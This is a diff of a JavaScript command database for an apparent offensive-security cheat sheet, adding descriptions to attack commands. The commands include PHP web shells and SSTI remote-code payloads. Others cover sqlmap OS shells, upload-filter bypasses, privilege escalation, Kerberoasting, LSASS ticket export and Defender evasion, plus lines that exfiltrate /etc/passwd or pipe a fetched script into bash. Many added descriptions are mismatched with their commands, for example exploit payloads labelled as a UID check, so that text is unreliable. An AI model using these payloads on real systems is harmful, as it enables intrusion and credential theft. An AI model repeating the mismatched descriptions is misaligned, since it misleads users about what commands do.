+          "command": "sqlmap -u \"http://<target>/?id=1\" -H 'Accept: text/html,*/*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'DNT: 1' --random-agent --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "type": "command",
@@ -145126,11 +146052,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Interactive OS shell (RCE)",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --os-shell"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --os-shell",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Interactive SQL shell",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --sql-shell"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --sql-shell",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Uploads a local file to the server via SQL injection.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nCreate the shell first: echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php."
@@ -145534,7 +146462,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Background + no shell",
-          "command": "ssh -f -N -D <socks_port> <user>@<pivot>"
+          "command": "ssh -f -N -D <socks_port> <user>@<pivot>",
+          "description": "Creates an SSH dynamic port forward (SOCKS proxy) - all traffic routed through it exits from the SSH server. Turns any SSH access into a full pivoting proxy."
         }
       ],
       "explain": "Opens a SOCKS proxy over SSH, turning the pivot into a gateway into its internal networks:\n  -D <socks_port>   dynamic application-level forward (a local SOCKS proxy)\n  <user>@<pivot>    SSH into the pivot with these creds\nPoint proxychains at 127.0.0.1:<socks_port> to route any tool through the pivot; add -N -f to background the tunnel without opening a shell."
@@ -145611,15 +146540,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "ssh-audit",
-          "command": "git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit\n./ssh-audit.py <ip>"
+          "command": "git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit\n./ssh-audit.py <ip>",
+          "description": "Clones a git repository. Exposed .git directories on web servers or accessible repos may contain source code, credentials, and configuration secrets."
         },
         {
           "label": "Enumerate auth methods (verbose)",
-          "command": "ssh -v <user>@<ip>"
+          "command": "ssh -v <user>@<ip>",
+          "description": "Connects to a remote host via SSH. Provides encrypted shell access and can create tunnels for pivoting."
         },
         {
           "label": "Force password auth",
-          "command": "ssh -v <user>@<ip> -o PreferredAuthentications=password"
+          "command": "ssh -v <user>@<ip> -o PreferredAuthentications=password",
+          "description": "Connects to a remote host via SSH. Provides encrypted shell access and can create tunnels for pivoting."
         }
       ],
       "opsec": "moderate",
@@ -146103,7 +147035,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Reverse SOCKS (-R dynamic)",
-          "command": "ssh -R <socks_port> <user>@<attacker>"
+          "command": "ssh -R <socks_port> <user>@<attacker>",
+          "description": "Creates an SSH remote port forward - makes a service on your machine accessible from the SSH server side. Useful for reverse tunneling when direct connections are blocked."
         }
       ],
       "explain": "Forwards a pivot-side port back to a service on your attack host (the reverse of -L):\n  -R <pivot_ip>:<remote_port>:<bind_ip>:<local_port>   open remote_port on the pivot, tunnel it to bind_ip:local_port on your side\n  <user>@<pivot>   the SSH pivot host\n  -vN              verbose, and no remote shell (tunnel only)\nLets a deeper host reach a service (or handler) only your attack box runs, by connecting to the pivot's remote_port."
@@ -146295,7 +147228,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Exclude your own subnet",
-          "command": "sudo sshuttle -r <user>@<pivot> <target_subnet> -x <your_subnet>"
+          "command": "sudo sshuttle -r <user>@<pivot> <target_subnet> -x <your_subnet>",
+          "description": "Executes a command with root privileges through sudo. Requires sudo permissions for the specific command."
         }
       ],
       "explain": "Builds a transparent VPN-like tunnel over SSH so you reach an internal subnet with any tool, no proxychains:\n  sudo            needs root to adjust local routing\n  -r <user>@<pivot>   SSH into the pivot as the gateway\n  <target_subnet>     the internal network to route through it (e.g. 172.16.5.0/23)\n  -v                  verbose\nAfter it starts, tools like nmap/xfreerdp hit the subnet directly; the pivot only needs Python, and -x excludes subnets you must not route."
@@ -147051,17 +147985,20 @@ const COMMAND_DATA = {
         {
           "command": "curl -s -X PATCH http://<target>/api/v1/<endpoint> -H \"Authorization: Bearer <jwt_token>\" -H \"Content-Type: application/json\" -d '{\"id\": \"<object_id>\", \"<uri_field>\": \"file:///etc/passwd\"}' | jq",
           "caption": "API SSRF: inject file:// URI into JSON property that server fetches",
-          "label": "PATCH - file:// local file read"
+          "label": "PATCH - file:// local file read",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "command": "curl -s -X PATCH http://<target>/api/v1/<endpoint> -H \"Authorization: Bearer <jwt_token>\" -H \"Content-Type: application/json\" -d '{\"id\": \"<object_id>\", \"<uri_field>\": \"http://169.254.169.254/latest/meta-data/\"}' | jq",
           "caption": "API SSRF via JSON property: cloud metadata endpoint",
-          "label": "PATCH - cloud metadata (169.254.169.254)"
+          "label": "PATCH - cloud metadata (169.254.169.254)",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "command": "curl -s -X GET http://<target>/api/v1/<endpoint>/<object_id>/document -H \"Authorization: Bearer <jwt_token>\"",
           "caption": "Retrieve SSRF-fetched content via follow-up GET (common in file-upload API flows)",
-          "label": "GET request"
+          "label": "GET request",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "defense": {
@@ -147576,11 +148513,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Math probe",
-          "command": "{{7*7}}  |  ${7*7}  |  <%= 7*7 %>  |  #{7*7}"
+          "command": "{{7*7}}  |  ${7*7}  |  <%= 7*7 %>  |  #{7*7}",
+          "description": "Server-Side Template Injection (SSTI) test payload. Checks whether the template engine evaluates expressions - a confirmed calculation result proves template injection is possible."
         },
         {
           "label": "Distinguish engine",
-          "command": "{{7*'7'}}   # Jinja2 -> 7777777, Twig -> 49"
+          "command": "{{7*'7'}}   # Jinja2 -> 7777777, Twig -> 49",
+          "description": "Server-Side Template Injection (SSTI) test payload. Checks whether the template engine evaluates expressions - a confirmed calculation result proves template injection is possible."
         }
       ],
       "steps": [
@@ -147836,11 +148775,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "popen one-liner",
-          "command": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+          "command": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "config leak",
-          "command": "{{ config.items() }}"
+          "command": "{{ config.items() }}",
+          "description": "Dumps the Jinja2 application configuration via Server-Side Template Injection. If config.items() renders, it exposes SECRET_KEY, database URIs, API keys, and other sensitive Flask/Django settings."
         }
       ],
       "explain": "Exploit SSTI in Jinja2 (Flask/Python) to read files and achieve RCE by walking Python's object hierarchy through __globals__ and __builtins__.:\n  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\nThe __builtins__ path works in standard Flask/Jinja2."
@@ -148082,7 +149023,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "registered function",
-          "command": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}"
+          "command": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Exploit SSTI in Twig (PHP/Symfony) to read files and achieve RCE via the filter() function piped to system() or passthru().:\n  {{ ['id'] | filter('system') }}\nfile_excerpt is only available in Symfony - plain Twig lacks it."
@@ -149472,11 +150414,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "GTFOBins lookup for an allowed binary",
-          "command": "# https://gtfobins.github.io/#+sudo  -> find the escape for the binary in sudo -l"
+          "command": "# https://gtfobins.github.io/#+sudo  -> find the escape for the binary in sudo -l",
+          "description": "Lists the commands the current user can run via sudo. Sudo misconfigurations (NOPASSWD entries, wildcard paths, or GTFOBins-eligible commands) are a primary privilege escalation vector on Linux."
         },
         {
           "label": "Preserve-env / LD_PRELOAD",
-          "command": "sudo LD_PRELOAD=/tmp/shell.so <allowed_binary>"
+          "command": "sudo LD_PRELOAD=/tmp/shell.so <allowed_binary>",
+          "description": "Executes a command with root privileges through sudo. Requires sudo permissions for the specific command."
         }
       ],
       "steps": [
@@ -149706,7 +150650,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Run a command via -z postrotate",
-          "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root.sh -Z root"
+          "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root.sh -Z root",
+          "description": "Run a command via -z postrotate. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Abuses tcpdump's post-rotate command hook to run a script as root:\n  sudo tcpdump -ln -i eth0   capture on the interface\n  -w /dev/null -W 1 -G 1   rotate the capture file every 1 second, keeping 1 file\n  -z /tmp/.test            run this script on each rotated file (executed as root)\n  -Z root                  drop privileges to root (so -z runs as root)\nPoint -z at a reverse-shell script and catch the root shell on your listener."
@@ -149790,7 +150735,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SGID (-6000)",
-          "command": "find / -uid 0 -perm -6000 -type f 2>/dev/null\nfind / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null"
+          "command": "find / -uid 0 -perm -6000 -type f 2>/dev/null\nfind / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "opsec": "loud",
@@ -150720,7 +151666,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Grep logon scripts for creds",
-          "command": "findstr /S /I /C:\"password\" \\\\<dc_host>\\SYSVOL\\<domain>\\scripts\\*"
+          "command": "findstr /S /I /C:\"password\" \\\\<dc_host>\\SYSVOL\\<domain>\\scripts\\*",
+          "description": "Grep logon scripts for creds. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Lists the domain logon-script folder in SYSVOL:\n  ls \\\\<dc_host>\\SYSVOL\\<domain>\\scripts   browse the replicated scripts share (readable by all domain users)\nLogon scripts (.bat/.vbs/.ps1) frequently hardcode credentials for drive mapping or privileged tasks; recurse SYSVOL and Select-String for 'password'/'net use', or reach it with smbclient."
@@ -150959,15 +151906,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Set SPN via AD Module",
-          "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Add='nonexistent/BLAH'}"
+          "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Add='nonexistent/BLAH'}",
+          "description": "Sets a Service Principal Name (SPN) on a target user account for targeted Kerberoasting. If you can write to the user object, add a fake SPN, request a service ticket, then crack it offline to get the password."
         },
         {
           "label": "Remove SPN via AD Module (cleanup)",
-          "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Remove='nonexistent/BLAH'}"
+          "command": "Set-ADUser -Identity <user> -ServicePrincipalNames @{Remove='nonexistent/BLAH'}",
+          "description": "Sets a Service Principal Name (SPN) on a target user account for targeted Kerberoasting. If you can write to the user object, add a fake SPN, request a service ticket, then crack it offline to get the password."
         },
         {
           "label": "Crack the targeted hash (John)",
-          "command": "john.exe --wordlist=<wordlist> <hashfile>"
+          "command": "john.exe --wordlist=<wordlist> <hashfile>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         }
       ],
       "explain": "Makes an SPN-less user Kerberoastable by writing a fake SPN you can then roast:\n  Set-DomainObject -Identity <user>   the user you have GenericWrite/GenericAll over\n  -Set @{serviceprincipalname='nonexistent/BLAH'}   plant an arbitrary SPN\nWith an SPN present, Rubeus kerberoast /user:<user> returns a TGS hash; crack it (hashcat -m 13100), then clear the SPN (-Clear serviceprincipalname) to clean up."
@@ -151702,11 +152652,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "CredSSP enablement (client side, one-time)",
-          "command": "Enable-WSManCredSSP -Role Client -DelegateComputer <hostA_fqdn> -Force"
+          "command": "Enable-WSManCredSSP -Role Client -DelegateComputer <hostA_fqdn> -Force",
+          "description": "CredSSP enablement (client side, one-time). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Register a loopback PSSession config to re-auth (RunAsCredential)",
-          "command": "Register-PSSessionConfiguration -Name creddemo -RunAsCredential <domain>\\<user> -Force ; Enter-PSSession -ComputerName localhost -ConfigurationName creddemo"
+          "command": "Register-PSSessionConfiguration -Name creddemo -RunAsCredential <domain>\\<user> -Force ; Enter-PSSession -ComputerName localhost -ConfigurationName creddemo",
+          "description": "Register a loopback PSSession config to re-auth (RunAsCredential). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Fixes the Kerberos double-hop problem - creds from a WinRM/PSRemoting session are not forwarded to a second hop, so DC access fails from the remote box:\n  createnetonly             spawn a new logon session (LOGON32_LOGON_NETONLY) with no cached creds\n  /program:powershell.exe   the process to launch in that clean session\n  /show                     reveal the spawned window\nInto that new window inject a TGT (Rubeus asktgt /ptt); now tools there authenticate to the DC directly, bypassing the missing second-hop credential."
@@ -152444,7 +153396,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "AES key instead of RC4",
-          "command": "ticketer.py -aesKey <child_krbtgt_aes> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> -user-id 500 Administrator"
+          "command": "ticketer.py -aesKey <child_krbtgt_aes> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> -user-id 500 Administrator",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "steps": [
@@ -153823,31 +154776,38 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Obfuscate a C# project (Loader/Rubeus)",
-          "command": "Codecepticon.exe --action obfuscate --module csharp --verbose --path <solution> --map-file <map_file>"
+          "command": "Codecepticon.exe --action obfuscate --module csharp --verbose --path <solution> --map-file <map_file>",
+          "description": "Obfuscate a C# project (Loader/Rubeus). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Obfuscate a PowerShell script (Invoke-Mimikatz)",
-          "command": "Codecepticon.exe --action obfuscate --module powershell --verbose --path <script_ps1> --map-file <map_file>"
+          "command": "Codecepticon.exe --action obfuscate --module powershell --verbose --path <script_ps1> --map-file <map_file>",
+          "description": "Obfuscate a PowerShell script (Invoke-Mimikatz). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Refresh the embedded Mimikatz DLL in the PS wrapper",
-          "command": "Invoke-UpdateMimikatzScript -DllPath <dll_file> -ScriptPath .\\Invoke-Mimikatz.ps1"
+          "command": "Invoke-UpdateMimikatzScript -DllPath <dll_file> -ScriptPath .\\Invoke-Mimikatz.ps1",
+          "description": "Refresh the embedded Mimikatz DLL in the PS wrapper. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Locate a flagged byte offset in a script",
-          "command": ".\\ByteToLineNumber.ps1 <script_ps1> <0xNNN>"
+          "command": ".\\ByteToLineNumber.ps1 <script_ps1> <0xNNN>",
+          "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
         },
         {
           "label": "Regenerate AES-encrypted strings",
-          "command": ".\\CustomAES-Generator-Encryption.ps1 > enc.txt"
+          "command": ".\\CustomAES-Generator-Encryption.ps1 > enc.txt",
+          "description": "Regenerate AES-encrypted strings. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Find the flagged bytes with DefenderCheck",
-          "command": "DefenderCheck.exe <binary_or_script>"
+          "command": "DefenderCheck.exe <binary_or_script>",
+          "description": "Find the flagged bytes with DefenderCheck. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Compile/execute via LOLBAS (csc.exe / MSBuild.exe)",
-          "command": "MSBuild.exe <inline_task>   # or: csc.exe /out:<out_exe> <source_cs>"
+          "command": "MSBuild.exe <inline_task>   # or: csc.exe /out:<out_exe> <source_cs>",
+          "description": "Bypasses application whitelisting by executing code through a signed Microsoft binary (LOLBin). These trusted binaries can load and execute arbitrary code, circumventing AppLocker and WDAC policies."
         }
       ],
       "notes": "Workflow when a signatured tool gets caught: (1) find what's flagged - AMSI/Defender byte offset -> ByteToLineNumber.ps1 maps it to a source line; (2) obfuscate the source with Codecepticon (renames symbols, encrypts strings) and rebuild; (3) for Invoke-Mimikatz, swap in a fresh/obfuscated powerkatz.dll via Invoke-UpdateMimikatzScript. Use the resulting binaries with crtp-loader (in-memory) and the PS scripts inside crtp-invishell. Reference card - no single command; see the linked tools. DefenderCheck locates the exact bytes Windows Defender flags; map the offset to a source line with ByteToLineNumber.ps1, then obfuscate that part. csc.exe/MSBuild.exe (LOLBAS) compile/run code inline to bypass application control (UMCI/AppLocker).",
@@ -153953,23 +154913,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Python 3 / 2",
-          "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'\npython2.7 -c 'import urllib;urllib.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'"
+          "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'\npython2.7 -c 'import urllib;urllib.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'",
+          "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
         },
         {
           "label": "PHP (file_get_contents / fopen)",
-          "command": "php -r '$file = file_get_contents(\"https://<ip>/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'"
+          "command": "php -r '$file = file_get_contents(\"https://<ip>/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'",
+          "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
         },
         {
           "label": "PHP fileless pipe",
-          "command": "php -r '$lines = @file(\"https://<ip>/LinEnum.sh\"); foreach ($lines as $l){ echo $l; }' | bash"
+          "command": "php -r '$lines = @file(\"https://<ip>/LinEnum.sh\"); foreach ($lines as $l){ echo $l; }' | bash",
+          "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
         },
         {
           "label": "Ruby / Perl",
-          "command": "ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://<ip>/LinEnum.sh\")))'\nperl -e 'use LWP::Simple; getstore(\"https://<ip>/LinEnum.sh\", \"LinEnum.sh\");'"
+          "command": "ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://<ip>/LinEnum.sh\")))'\nperl -e 'use LWP::Simple; getstore(\"https://<ip>/LinEnum.sh\", \"LinEnum.sh\");'",
+          "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
         },
         {
           "label": "Windows JScript / VBScript",
-          "command": "cscript.exe /nologo wget.js https://<ip>/PowerView.ps1 PowerView.ps1\ncscript.exe /nologo wget.vbs https://<ip>/PowerView.ps1 PowerView2.ps1"
+          "command": "cscript.exe /nologo wget.js https://<ip>/PowerView.ps1 PowerView.ps1\ncscript.exe /nologo wget.vbs https://<ip>/PowerView.ps1 PowerView2.ps1",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "opsec": "quiet",
@@ -154162,15 +155127,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Python upload (requests)",
-          "command": "python3 -c 'import requests;requests.post(\"http://<lhost>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'"
+          "command": "python3 -c 'import requests;requests.post(\"http://<lhost>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         },
         {
           "label": "Python read a served file",
-          "command": "python3 -c \"import urllib.request;print(urllib.request.urlopen('http://<ip>/flag.txt').read().decode())\""
+          "command": "python3 -c \"import urllib.request;print(urllib.request.urlopen('http://<ip>/flag.txt').read().decode())\"",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         },
         {
           "label": "Perl download (HTTP::Tiny)",
-          "command": "perl -e 'use HTTP::Tiny; my $r=HTTP::Tiny->new->get(\"http://<ip>:8000/test.txt\"); open(F,\">perl_test.txt\"); print F $r->{content}; close(F);'"
+          "command": "perl -e 'use HTTP::Tiny; my $r=HTTP::Tiny->new->get(\"http://<ip>:8000/test.txt\"); open(F,\">perl_test.txt\"); print F $r->{content}; close(F);'",
+          "description": "Perl download (HTTP::Tiny). See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "quiet",
@@ -154311,15 +155279,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "FTP commands + args (logins, RETR filenames)",
-          "command": "tshark -r <file>.pcapng -Y \"ftp.request.command\" -T fields -e ftp.request.command -e ftp.request.arg"
+          "command": "tshark -r <file>.pcapng -Y \"ftp.request.command\" -T fields -e ftp.request.command -e ftp.request.arg",
+          "description": "FTP commands + args (logins, RETR filenames). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Files pulled over FTP (RETR)",
-          "command": "tshark -r <file>.pcapng -Y \"ftp.request.command == RETR\" -T fields -e ftp.request.arg"
+          "command": "tshark -r <file>.pcapng -Y \"ftp.request.command == RETR\" -T fields -e ftp.request.arg",
+          "description": "Files pulled over FTP (RETR). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Grep strings for card numbers / keywords",
-          "command": "strings <file>.pcapng | grep -iE '\\b[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}\\b'"
+          "command": "strings <file>.pcapng | grep -iE '\\b[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}\\b'",
+          "description": "Grep strings for card numbers / keywords. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "Complements Pcredz (automated) with targeted extraction. Cleartext protocols (FTP, HTTP, POP3, SMTP, SNMP, Telnet) leak creds; follow the TCP stream in Wireshark for full context. Pair with Responder/MITM to generate the capture.\nAlso covered in: OSCP PEN-200 Chapter 19 (Password Attacks)",
@@ -155123,19 +156094,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "AD Module: find computers with unconstrained delegation",
-          "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name,DNSHostName"
+          "command": "Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name,DNSHostName",
+          "description": "Finds computer accounts trusted for unconstrained Kerberos delegation. These machines cache TGTs of any user who authenticates to them - compromising one lets you steal domain admin tickets."
         },
         {
           "label": "AD Module: find users with unconstrained delegation",
-          "command": "Get-ADUser -Filter {TrustedForDelegation -eq $True} | select Name"
+          "command": "Get-ADUser -Filter {TrustedForDelegation -eq $True} | select Name",
+          "description": "Queries Active Directory user objects with specific filters to identify accounts of interest for further enumeration or attack."
         },
         {
           "label": "Passive ticket extraction from LSASS",
-          "command": "SafetyKatz.exe \"evasive-sekurlsa::tickets /export\""
+          "command": "SafetyKatz.exe \"evasive-sekurlsa::tickets /export\"",
+          "description": "Exports all Kerberos tickets from LSASS memory. Captures TGTs and service tickets for pass-the-ticket attacks or offline analysis."
         },
         {
           "label": "DFSCoerce (alternative to Printer Bug)",
-          "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t <dc_host> -l <unconstrained_host>"
+          "command": "C:\\AD\\Tools\\DFSCoerce-andrea.exe -t <dc_host> -l <unconstrained_host>",
+          "description": "DFSCoerce (alternative to Printer Bug). See the command syntax for exact parameters and flags."
         }
       ],
       "recommended": [
@@ -155385,11 +156360,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "script",
-          "command": "/usr/bin/script -qc /bin/bash /dev/null"
+          "command": "/usr/bin/script -qc /bin/bash /dev/null",
+          "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "stty (full steps)",
-          "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\n# then in the shell:\nexport TERM=xterm; stty rows 38 columns 116"
+          "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\n# then in the shell:\nexport TERM=xterm; stty rows 38 columns 116",
+          "description": "Python reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         }
       ],
       "opsec": "loud",
@@ -155793,19 +156770,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Alternate PHP extensions",
-          "command": "shell.phtml  |  shell.php5  |  shell.phar  |  shell.pht"
+          "command": "shell.phtml  |  shell.php5  |  shell.phar  |  shell.pht",
+          "description": "File upload bypass technique using double extensions, null bytes, or alternative PHP extensions. Tricks the upload filter into accepting a PHP web shell as an image file."
         },
         {
           "label": "Double extension",
-          "command": "shell.jpg.php"
+          "command": "shell.jpg.php",
+          "description": "File upload bypass technique using double extensions, null bytes, or alternative PHP extensions. Tricks the upload filter into accepting a PHP web shell as an image file."
         },
         {
           "label": "Null byte (old PHP)",
-          "command": "shell.php%00.jpg"
+          "command": "shell.php%00.jpg",
+          "description": "File upload bypass technique using double extensions, null bytes, or alternative PHP extensions. Tricks the upload filter into accepting a PHP web shell as an image file."
         },
         {
           "label": "Case / trailing char",
-          "command": "shell.PhP  |  shell.php."
+          "command": "shell.PhP  |  shell.php.",
+          "description": "File upload bypass using mixed-case extension (.PhP). Circumvents case-sensitive file extension blacklists while PHP still processes the file."
         }
       ],
       "explain": "Beats a server-side blacklist that only blocks known-bad extensions (e.g. php, php7, phps) by using an alternate extension the web server still executes as PHP.:\n  shell.phtml\nFuzz the filename extension in Burp Intruder with a list like PayloadsAllTheThings extensions.lst or SecLists web-extensions.txt (fuzz position: filename=\"HTB.FUZZ\")."
@@ -156026,7 +157007,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Intercept + swap content-type",
-          "command": "# Burp: change Content-Type to image/png, keep .php filename"
+          "command": "# Burp: change Content-Type to image/png, keep .php filename",
+          "description": "Intercept + swap content-type. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Defeats upload restrictions enforced only in the browser (JavaScript/HTML).:\n  Content-Disposition: form-data; name=\"uploadFile\"; filename=\"shell.php\"\nTwo ways: (1) intercept the upload POST in Burp Proxy and change the multipart filename to shell.php with the PHP shell as the body; (2) edit the page HTML in devtools to remove the onchange=\"checkFile(this)\" handler and the accept=\".jpg,...\" attribute, then upload directly."
@@ -156097,7 +157079,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Content-Type header",
-          "command": "Content-Type: image/jpeg"
+          "command": "Content-Type: image/jpeg",
+          "description": "Content-Type header manipulation for file upload bypass. Changes the MIME type in the upload request to trick the server into accepting a payload file as a permitted file type."
         }
       ],
       "opsec": "loud",
@@ -156342,15 +157325,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SQL injection",
-          "command": "file';select+sleep(5);--.jpg"
+          "command": "file';select+sleep(5);--.jpg",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "XSS",
-          "command": "'\"><img src=1 onerror=alert(window.origin)>.jpg"
+          "command": "'\"><img src=1 onerror=alert(window.origin)>.jpg",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "Windows-specific (reserved names / chars / 8.3)",
-          "command": "# Reserved characters - cause errors or unexpected behaviour:\n| < > * ?\n\n# Reserved filenames - Windows cannot write these; triggers error disclosing path:\nCON.jpg    COM1.jpg    LPT1.jpg    NUL.jpg\n\n# 8.3 short-name aliasing - overwrite or reference existing files:\nHAC~1.TXT   # first file starting with HAC\nHAC~2.TXT   # second match\nWEB~1.CON   # targets web.conf if it exists in the upload path"
+          "command": "# Reserved characters - cause errors or unexpected behaviour:\n| < > * ?\n\n# Reserved filenames - Windows cannot write these; triggers error disclosing path:\nCON.jpg    COM1.jpg    LPT1.jpg    NUL.jpg\n\n# 8.3 short-name aliasing - overwrite or reference existing files:\nHAC~1.TXT   # first file starting with HAC\nHAC~2.TXT   # second match\nWEB~1.CON   # targets web.conf if it exists in the upload path",
+          "description": "Windows-specific (reserved names / chars / 8.3). See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "loud",
@@ -156700,11 +157686,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PHP one-liner webshell",
-          "command": "echo '<?php system($_GET[0]); ?>' > shell.php"
+          "command": "echo '<?php system($_GET[0]); ?>' > shell.php",
+          "description": "Web shell payload that executes operating system commands through a web request. Provides command execution on the web server via a simple HTTP parameter."
         },
         {
           "label": "ASPX (IIS)",
